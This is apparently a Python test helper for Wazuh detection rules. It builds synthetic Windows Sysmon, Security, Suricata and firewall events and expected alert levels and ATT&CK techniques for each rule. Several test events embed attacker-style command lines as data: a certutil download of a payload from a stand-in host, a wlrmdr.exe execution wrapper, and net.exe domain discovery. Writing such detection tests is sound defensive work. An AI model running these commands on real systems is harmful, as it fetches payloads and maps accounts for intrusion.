"""Event builders for the engine tests.

The engine tests send events to the real wazuh-analysisd through wazuh-logtest. Windows
events are sent in the JSON form that the manager produces after decoding an eventchannel
message ({"win": {"system": ..., "eventdata": ...}}), which is the same text that appears in
the full_log field of an alert.

Field values are written the way Wazuh stores them: backslashes doubled and quotes escaped
as backslash-quote. json.dumps adds one more level of escaping, and the JSON decoder in the
manager removes it again, so the rules see the stored form.
"""
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from cases import CASES  # noqa: E402

COMPUTER = "WS01.corp.lab"


def _set(tree, dotted, value):
    parts = dotted.split(".")
    node = tree
    for part in parts[:-1]:
        node = node.setdefault(part, {})
    node[parts[-1]] = value


def _merge(base, fields):
    for dotted, value in fields.items():
        _set(base, dotted, value)
    return base


def sysmon_event1(fields):
    event = {"win": {
        "system": {
            "providerName": "Microsoft-Windows-Sysmon",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "eventID": "1", "version": "5", "level": "4", "task": "1", "opcode": "0",
            "keywords": "0x8000000000000000", "systemTime": "2026-10-15T20:36:17.000000000Z",
            "eventRecordID": "1000", "processID": "2232", "threadID": "3100",
            "channel": "Microsoft-Windows-Sysmon/Operational", "computer": COMPUTER,
            "severityValue": "INFORMATION", "message": "Process Create",
        },
        "eventdata": {
            "ruleName": "-", "utcTime": "2026-10-15 20:36:17.000",
            "processId": "6408", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "fileVersion": "10.0.26100.1", "description": "Windows Command Processor",
            "product": "Microsoft Windows Operating System", "company": "Microsoft Corporation",
            "originalFileName": "Cmd.Exe", "commandLine": "cmd.exe",
            "currentDirectory": "C:\\\\Windows\\\\System32\\\\", "user": "CORP\\\\adm.truong",
            "logonId": "0x1f4a2b", "terminalSessionId": "1", "integrityLevel": "High",
            "hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
            "parentProcessId": "5120",
            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "parentCommandLine": "powershell.exe", "parentUser": "CORP\\\\adm.truong",
        },
    }}
    return _merge(event, fields)


def security_4688(fields):
    event = {"win": {
        "system": {
            "providerName": "Microsoft-Windows-Security-Auditing",
            "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
            "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0",
            "keywords": "0x8020000000000000", "systemTime": "2026-10-15T20:36:17.000000000Z",
            "eventRecordID": "2000", "processID": "4", "threadID": "100",
            "channel": "Security", "computer": COMPUTER,
            "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.",
        },
        "eventdata": {
            "subjectUserSid": "S-1-5-21-1-2-3-1104", "subjectUserName": "adm.truong",
            "subjectDomainName": "CORP", "subjectLogonId": "0x1f4a2b",
            "newProcessId": "0x1908", "newProcessName": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "tokenElevationType": "%%1937", "processId": "0x1400",
            "commandLine": "cmd.exe",
            "targetUserSid": "S-1-0-0", "targetUserName": "-", "targetDomainName": "-",
            "targetLogonId": "0x0",
            "parentProcessName": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "mandatoryLabel": "S-1-16-12288",
        },
    }}
    return _merge(event, fields)


def security_4720(fields):
    event = {"win": {
        "system": {
            "providerName": "Microsoft-Windows-Security-Auditing",
            "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
            "eventID": "4720", "version": "0", "level": "0", "task": "13824", "opcode": "0",
            "keywords": "0x8020000000000000", "systemTime": "2026-10-15T21:11:48.000000000Z",
            "eventRecordID": "3000", "processID": "4", "threadID": "100",
            "channel": "Security", "computer": COMPUTER,
            "severityValue": "AUDIT_SUCCESS", "message": "A user account was created.",
        },
        "eventdata": {
            "targetUserName": "T1136.001_CMD", "targetDomainName": "WS01",
            "targetSid": "S-1-5-21-9-8-7-1001", "subjectUserSid": "S-1-5-21-1-2-3-1104",
            "subjectUserName": "adm.truong", "subjectDomainName": "CORP",
            "subjectLogonId": "0x1f4a2b", "privilegeList": "-",
            "samAccountName": "T1136.001_CMD",
        },
    }}
    return _merge(event, fields)


def eventlog_cleared(event_id):
    """Event 1102 (Security channel) or 104 (System channel) from the Eventlog provider."""
    channel = "Security" if event_id == "1102" else "System"
    return {"win": {
        "system": {
            "providerName": "Microsoft-Windows-Eventlog",
            "providerGuid": "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}",
            "eventID": event_id, "version": "0", "level": "4", "task": "104", "opcode": "0",
            "keywords": "0x4020000000000000", "systemTime": "2026-10-15T21:23:30.000000000Z",
            "eventRecordID": "4000", "processID": "1100", "threadID": "2200",
            "channel": channel, "computer": COMPUTER, "severityValue": "INFORMATION",
            "message": "The log file was cleared.",
        },
        "eventdata": {"subjectUserName": "adm.truong", "subjectDomainName": "CORP",
                      "subjectLogonId": "0x1f4a2b", "channel": "Application"},
    }}


SYSMON_RULES = {
    "100100", "100101", "100500", "100501", "100550", "100552",
    "100600", "100601", "100602", "100603", "100604", "100605", "100606",
    "100700", "100710", "100720",
}
SEC4688_RULES = {"100701", "100711", "100721", "100722"}

SURICATA_LINE = (
    'Oct 15 15:40:51 FW01.corp.lab suricata[53242]: {"timestamp":"2026-10-15T15:40:51.123456-0400",'
    '"flow_id":1234567890123,"in_iface":"igb4","event_type":"alert","src_ip":"10.10.50.181","src_port":41352,'
    '"dest_ip":"10.10.30.149","dest_port":1433,"proto":"TCP","alert":{"action":"allowed","gid":1,'
    '"signature_id":2010935,"rev":3,"signature":"ET SCAN Suspicious inbound to MSSQL port 1433",'
    '"category":"Potential Corporate Privacy Violation","severity":2}}'
)
SURICATA_NON_SCAN = SURICATA_LINE.replace(
    "ET SCAN Suspicious inbound to MSSQL port 1433", "ET POLICY Possible Bitcoin Mining Pool Connection")
SURICATA_STATS = SURICATA_LINE.replace('"event_type":"alert"', '"event_type":"stats"')

# Modelled on the filterlog example shipped with the Wazuh pf decoder.
FILTERLOG_BLOCK = ("Oct 15 15:03:08 FW01 filterlog[4412]: 65,,,0,igb3,match,block,in,4,0x0,,64,21011,0,none,1,"
                   "icmp,84,10.10.30.149,10.10.50.254,datalength=64")
FILTERLOG_PASS = FILTERLOG_BLOCK.replace(",block,", ",pass,")
FILTERLOG_EXTERNAL = FILTERLOG_BLOCK.replace("10.10.30.149", "203.0.113.7")


# Exact oracles for every positive synthetic engine case. Empty MITRE arrays are
# intentional for parent/telemetry rules that do not declare a technique.
POSITIVE_ORACLES = {
    "100100": (6, ["T1082"]),
    "100101": (8, ["T1082", "T1036.003"]),
    "100200": (6, []),
    "100300": (3, []),
    "100301": (7, ["T1046"]),
    "100400": (10, ["T1136.002"]),
    "100450": (8, ["T1136.001"]),
    "100500": (8, ["T1053.005"]),
    "100501": (8, ["T1053.005", "T1036.003"]),
    "100550": (8, ["T1070.001"]),
    "100551": (8, ["T1070.001"]),
    "100552": (8, ["T1070.001", "T1036.003"]),
    "100600": (6, ["T1087.001"]),
    "100601": (6, ["T1069.001"]),
    "100602": (6, ["T1555.004"]),
    "100603": (6, ["T1033"]),
    "100604": (6, ["T1087.002"]),
    "100605": (6, ["T1069.002"]),
    "100606": (6, ["T1201"]),
    "100700": (12, ["T1105"]),
    "100701": (8, ["T1105"]),
    "100710": (6, ["T1021.002"]),
    "100711": (6, ["T1021.002"]),
    "100720": (8, ["T1202"]),
    "100721": (8, ["T1202"]),
    "100722": (8, ["T1202"]),
}


def positive_expect(rule_id):
    try:
        level, mitre = POSITIVE_ORACLES[rule_id]
    except KeyError as exc:
        raise ValueError(f"positive case has no level/MITRE oracle for rule {rule_id}") from exc
    return {"rule_id": rule_id, "level": level, "mitre": list(mitre)}


def build_cases():
    """Return complete synthetic positive/negative engine cases with exact oracles."""
    cases = []
    for index, (rule_id, fields, positive) in enumerate(CASES):
        # 100400 is a frequency rule; its complete event sequences are added below.
        # The lightweight pattern samples in cases.py only cover its field scope.
        if rule_id == "100400":
            continue
        if rule_id in SYSMON_RULES:
            event = sysmon_event1(fields)
        elif rule_id in SEC4688_RULES:
            event = security_4688(fields)
        elif rule_id == "100450":
            event = security_4720(fields)
        elif rule_id == "100301":
            line = SURICATA_LINE if positive else SURICATA_NON_SCAN
            cases.append(dict(name=f"{rule_id} {'positive' if positive else 'negative'} #{index}",
                              rule=rule_id, kind="synthetic", events=[line], log_format="syslog",
                              expect=(positive_expect(rule_id) if positive else {"not_rule_id": rule_id})))
            continue
        else:
            raise SystemExit(f"no engine template for rule {rule_id}")
        cases.append(dict(
            name=f"{rule_id} {'positive' if positive else 'negative'} #{index}",
            rule=rule_id, kind="synthetic", events=[json.dumps(event, separators=(",", ":"))],
            log_format="syslog",
            expect=(positive_expect(rule_id) if positive else {"not_rule_id": rule_id})))

    def add(name, rule, events, expect, log_format="syslog"):
        cases.append(dict(name=name, rule=rule, kind="synthetic", events=events,
                          log_format=log_format, expect=expect))

    dump = lambda event: json.dumps(event, separators=(",", ":"))  # noqa: E731

    # Parent and decoder behavior that field-pattern samples cannot verify.
    add("100300 parent alert (any Suricata alert)", "100300", [SURICATA_NON_SCAN], positive_expect("100300"))
    add("100300 negative, not an alert event", "100300", [SURICATA_STATS], {"not_rule_id": "100300"})
    add("100200 firewall block between lab segments", "100200", [FILTERLOG_BLOCK], positive_expect("100200"))
    add("100200 negative, traffic that was passed", "100200", [FILTERLOG_PASS], {"not_rule_id": "100200"})
    add("100200 negative, source outside the lab range", "100200", [FILTERLOG_EXTERNAL], {"not_rule_id": "100200"})
    add("100551 Security 1102 audit log cleared", "100551", [dump(eventlog_cleared("1102"))], positive_expect("100551"))
    add("100551 System 104 log file cleared", "100551", [dump(eventlog_cleared("104"))], positive_expect("100551"))

    # Direct binary identity positives and wrapper-only negatives.
    certutil = sysmon_event1({
        "win.eventdata.image": r"C:\\Windows\\System32\\certutil.exe",
        "win.eventdata.originalFileName": "CertUtil.exe",
        "win.eventdata.commandLine": r"certutil.exe -urlcache -split -f https://example.invalid/payload.exe C:\\Temp\\payload.exe",
    })
    add("100700 positive, certutil image with urlcache arguments", "100700",
        [dump(certutil)], positive_expect("100700"))
    benign_echo = sysmon_event1({
        "win.eventdata.image": r"C:\\Windows\\System32\\cmd.exe",
        "win.eventdata.originalFileName": "Cmd.Exe",
        "win.eventdata.commandLine": r"cmd.exe /c echo certutil -urlcache -split -f probe-002",
    })
    add("100700 negative, captured benign certutil echo", "100700",
        [dump(benign_echo)], {"not_rule_id": "100700"})
    mismatch_original_name = sysmon_event1({
        "win.eventdata.image": r"C:\\Windows\\System32\\cmd.exe",
        "win.eventdata.originalFileName": "Cmd.Exe",
        "win.eventdata.commandLine": r"cmd.exe /c certutil.exe -urlcache -split -f https://example.invalid/file",
    })
    add("100700 negative, certutil arguments under cmd.exe image", "100700",
        [dump(mismatch_original_name)], {"not_rule_id": "100700"})

    # PowerShell cmdlet equivalents are deliberately outside the net.exe detections.
    for cmdlet, target_rule in (("Get-LocalUser", "100600"), ("Get-ADUser", "100600"),
                                ("Get-LocalGroup", "100601"), ("Get-ADGroup", "100601")):
        ps_event = sysmon_event1({
            "win.eventdata.image": r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "win.eventdata.originalFileName": "PowerShell.EXE",
            "win.eventdata.commandLine": f"powershell.exe -NoProfile -Command {cmdlet}",
        })
        add(f"{target_rule} negative, PowerShell cmdlet {cmdlet}", target_rule,
            [dump(ps_event)], {"not_rule_id": target_rule})

    # The shell wrapper contains Wlrmdr text, but its image/newProcessName is PowerShell.
    wlr_wrapper_sysmon = sysmon_event1({
        "win.eventdata.image": r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "win.eventdata.originalFileName": "PowerShell.EXE",
        "win.eventdata.commandLine": r'"powershell.exe" &amp; {wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u "C:\\Windows\\System32\\calc.exe"}',
    })
    add("100720 negative, Wlrmdr text in a PowerShell command line", "100720",
        [dump(wlr_wrapper_sysmon)], {"not_rule_id": "100720"})

    # The domain path is explicitly DC01 + Security 4720 + CORP; local creation
    # events and a local target domain remain outside the burst rule.
    def account(name, computer="DC01.corp.lab", target_domain="CORP", actor="Administrator"):
        return dump(security_4720({
            "win.system.computer": computer,
            "win.system.channel": "Security",
            "win.eventdata.targetUserName": name,
            "win.eventdata.targetDomainName": target_domain,
            "win.eventdata.samAccountName": name,
            "win.eventdata.subjectUserName": actor,
        }))

    domain_nine = [account(f"zz.domain{i}") for i in range(1, 10)]
    add("100400 boundary, 9 DC domain accounts stay below threshold", "100400",
        domain_nine, {"not_rule_id": "100400"})
    add("100400 boundary, 10 DC domain accounts fire", "100400",
        domain_nine + [account("zz.domain10")], positive_expect("100400"))
    add("100400 negative, local accounts on WS01 do not form a domain burst", "100400",
        [account(f"zz.local{i}", computer="WS01.corp.lab", target_domain="WS01")
         for i in range(1, 11)], {"not_rule_id": "100400"})
    add("100400 negative, local target domain on DC01 is not a domain burst", "100400",
        [account(f"zz.wrongdomain{i}", target_domain="WS01") for i in range(1, 11)],
        {"not_rule_id": "100400"})

    # The account/group split and policy discovery have separate ATT&CK oracles.
    for rule, command, technique in (
        ("100604", "net.exe user /domain", "T1087.002"),
        ("100605", "net.exe group /domain", "T1069.002"),
        ("100606", "net.exe accounts", "T1201"),
    ):
        event = sysmon_event1({
            "win.eventdata.image": r"C:\\Windows\\System32\\net.exe",
            "win.eventdata.originalFileName": "net.exe",
            "win.eventdata.commandLine": command,
        })
        add(f"{rule} positive, {command}", rule, [dump(event)],
            {"rule_id": rule, "level": 6, "mitre": [technique]})

    # Only Windows administrative shares should satisfy 100710.
    public_share = sysmon_event1({
        "win.eventdata.commandLine": r"copy a.txt \\fileserver\public\a.txt",
    })
    add("100710 negative, ordinary public share", "100710",
        [dump(public_share)], {"not_rule_id": "100710"})
    public_share_4688 = security_4688({
        "win.eventdata.commandLine": r"copy a.txt \\fileserver\public\a.txt",
    })
    add("100711 negative, ordinary public share", "100711",
        [dump(public_share_4688)], {"not_rule_id": "100711"})

    # Assert that no new positive case is added without a complete oracle.
    for case in cases:
        expectation = case["expect"]
        if "rule_id" in expectation and case["kind"] == "synthetic":
            if "level" not in expectation or "mitre" not in expectation:
                raise ValueError(f"positive synthetic case lacks exact level/MITRE: {case['name']}")
    return cases
